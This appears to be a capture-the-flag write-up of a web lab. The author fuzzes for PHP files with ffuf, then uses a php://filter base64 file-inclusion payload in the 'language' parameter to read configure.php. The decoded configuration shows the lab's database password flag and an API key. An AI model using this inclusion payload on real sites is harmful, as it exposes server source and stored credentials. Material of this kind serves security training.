## Challenge
 Fuzz the web application for other php scripts, and then read one of the configuration files and submit the database password as the answer

 ## Solution

 I did the fuzzing with ffuf:

 ```sh
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.116:32796/FUZZ.php
```

Abd found out a file `configure.php`.

I went to the website and there is an option to change the language, which goes to:

`http://94.237.54.116:32796/index.php?language=es`

I try to put there the `configure` file:

`http://94.237.54.116:32796/index.php?language=configure` but nothing comes out, so now I try the filter:

`http://94.237.54.116:32796/index.php?language=php://filter/read=convert.base64-encode/resource=configure`

And I got the file encoded in base64:

`PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0+ICdibG9nZGInCik7CgokQVBJX0tFWSA9ICJBd2V3MjQyR0RzaHJmNDYrMzUvayI7`

I decode it using the `Burp Decoder`, and the result is:

```php
<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";
```

And here I see the password to the database, which was the goal to solve the lab.






